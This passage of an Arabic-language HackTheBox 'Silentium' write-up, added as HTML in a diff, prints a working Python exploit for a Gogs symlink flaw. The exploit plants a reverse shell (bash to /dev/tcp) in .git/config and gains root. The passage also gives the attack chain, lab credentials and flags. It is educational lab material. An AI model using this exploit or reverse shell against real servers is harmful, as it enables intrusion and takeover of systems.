+open(os.path.join(work, "README.md"), "w").write("x\n")
+subprocess.run(["git", "add", "-A"], capture_output=True)
+subprocess.run(["git", "commit", "-m", "init"], capture_output=True)
+
+# 3. رفع الـ Repo إلى Gogs (كلمة السر تحتوي @ مشفّرة)
+push_url = f"http://{USERNAME}:{PASSWORD}@127.0.0.1:3001/{USERNAME}/{REPO}.git"
+result = subprocess.run(
+    ["git", "push", push_url, "master", "--force"],
+    capture_output=True,
+    env={**os.environ, "GIT_TERMINAL_PROMPT": "0"}
+)
+print(f"[+] Push result: {result.returncode}")
+print(result.stderr.decode())
+
+# 4. الحصول على SHA الحالي للـ Symlink (مطلوب لـ PUT)
+r = s.get(f"{GOGS_URL}/api/v1/repos/{USERNAME}/{REPO}/contents/symlink")
+print(f"[+] GET symlink status: {r.status_code}")
+sha = r.json()["sha"]
+print(f"[+] SHA: {sha}")
+
+# 5. إنشاء .git/config خبيث مع reverse shell في sshCommand
+config = (
+    "[core]\n"
+    "\trepositoryformatversion = 0\n"
+    "\tfilemode = true\n"
+    "\tbare = false\n"
+    f"\tsshCommand = bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'\n"
+    "[remote \"origin\"]\n"
+    "\turl = ssh://localhost/x\n"       # ssh:// ضروري لتفعيل sshCommand
+    "\tfetch = +refs/heads/*:refs/remotes/origin/*\n"
+    "[branch \"master\"]\n"
+    "\tremote = origin\n"
+    "\tmerge = refs/heads/master\n"
+)
+
+# 6. الكتابة عبر الـ Symlink — Gogs سيكتب في .git/config!
+r = s.put(
+    f"{GOGS_URL}/api/v1/repos/{USERNAME}/{REPO}/contents/symlink",
+    json={
+        "content": base64.b64encode(config.encode()).decode(),
+        "message": "update",
+        "sha": sha
+    }
+)
+print(f"[+] PUT status: {r.status_code}")
+# 500 = طبيعي! الكتابة تمت رغم الخطأ
+print("[+] Exploit sent, check your listener!")</code></pre>
+
+  <h3>الخطوة 3 — تشغيل الـ Exploit</h3>
+  <pre><code># على الجهاز المستهدف (ben@silentium):
+python3 /home/ben/exploit2.py</code></pre>
+
+  <h3>الخطوة 4 — النتيجة على الـ Listener</h3>
+  <pre><code>[+] Waiting for connection on port 9001...
+[+] Connection from ('10.129.30.31', 34380)
+bash: cannot set terminal process group: Inappropriate ioctl for device
+bash: no job control in this shell
+
+root@silentium:/opt/gogs/gogs/data/tmp/local-repo/27# id
+uid=0(root) gid=0(root) groups=0(root)</code></pre>
+
+  <div class="alert a-green">
+    ✅ <strong>Root Shell!</strong> الـ exploit نجح وحصلنا على root shell على الجهاز الأصلي
+  </div>
+</div>
+
+<!-- ===== 11. ROOT FLAG ===== -->
+<div class="section" id="s11">
+  <h2>11 — Root Flag <span class="num-badge">Step 11</span></h2>
+
+  <pre><code>root@silentium:~# cat /root/root.txt
+<span class="flag-blur">2e9dbfd204373fe99b6d1dac7e531780</span></code></pre>
+
+  <div class="alert a-green" style="font-size:1.1rem; text-align:center;">
+    🏆 تم اختراق الجهاز بالكامل! Root Flag: <strong class="flag-blur">2e9dbfd204373fe99b6d1dac7e531780</strong>
+  </div>
+</div>
+
+<!-- ===== 12. CHAIN ===== -->
+<div class="section" id="s12">
+  <h2>12 — ملخص سلسلة الهجوم <span class="num-badge">Summary</span></h2>
+
+  <div class="chain">Port 80 (nginx)
+ └── silentium.htb — صفحة مؤسسة مالية
+      └── VHOST: staging.silentium.htb — Flowise AI 3.0.5
+           └── [CVE-2025-59528] Password reset token disclosure
+                └── Account takeover — ben@silentium.htb
+                     └── JWT Token → CustomMCP RCE (JS injection)
+                          └── Root shell داخل Docker container
+                               └── env → SMTP_PASSWORD: r04D!!_R4ge
+                                    └── SSH ben@silentium — user.txt ✅
+                                         └── ss -tlnp → Gogs :3001 (root)
+                                              └── [CVE-2025-8110] Symlink .git/config
+                                                   └── Root shell — root.txt ✅ 🏆</div>
+</div>
+
+<!-- ===== 13. CREDENTIALS ===== -->
+<div class="section" id="s13">
+  <h2>13 — جميع الـ Credentials المُكتشفة <span class="num-badge">Creds</span></h2>
+
+  <table>
+    <tr><th>المصدر</th><th>المستخدم</th><th>كلمة السر / الـ Hash</th></tr>
+    <tr><td>Flowise Token Disclosure</td><td>ben@silentium.htb</td><td><span class="ic">$2a$05$hse1NxgA...</span></td></tr>
+    <tr><td>Docker ENV — Flowise</td><td>ben</td><td><span class="ic">F1l3_d0ck3r</span></td></tr>
+    <tr><td>Docker ENV — SMTP</td><td>—</td><td><span class="ic">r04D!!_R4ge</span></td></tr>
+    <tr><td>SSH (password reuse)</td><td>ben</td><td><span class="ic">r04D!!_R4ge</span></td></tr>
+    <tr><td>Docker ENV — JWT Secret</td><td>—</td><td><span class="ic">AABBCCDD...</span></td></tr>
+    <tr><td>Flowise DB Encryption Key</td><td>—</td><td><span class="ic">hdsVqdkOcLN4fwdpvMPtbAi2++qi8yFc</span></td></tr>
+    <tr><td>Gogs app.ini</td><td>—</td><td><span class="ic">sdsrcxSm0iC7wDO</span> (SECRET_KEY)</td></tr>
+    <tr><td>Gogs حساب مسجّل</td><td>yyty</td><td><span class="ic">Max@123max</span></td></tr>
+  </table>
+
+  <h3>الـ Flags</h3>
+  <table>
+    <tr><th>الـ Flag</th><th>القيمة</th></tr>
+    <tr><td>User (ben)</td><td><span class="ic flag-blur">af682b00e02e1e4c████████████████</span></td></tr>
+    <tr><td>Root</td><td><span class="ic flag-blur">2e9dbfd204373fe99b6d1dac7e531780</span></td></tr>
+  </table>
+</div>
+
+</div><!-- /container -->
+
+<footer>
+  <p>HackTheBox — Silentium | CVE-2025-59528 + CVE-2025-8110</p>
+  <p style="margin-top:8px; color:#333;">للأغراض التعليمية فقط — بيئات مرخصة</p>
+</footer>
+
+<script>
+document.querySelectorAll('.flag-blur').forEach(function(el) {
+  el.title = 'انقر للكشف عن الـ Flag';
+  el.addEventListener('click', function() {
+    this.classList.toggle('revealed');
+  });
+});
+</script>
+</body>
+</html>
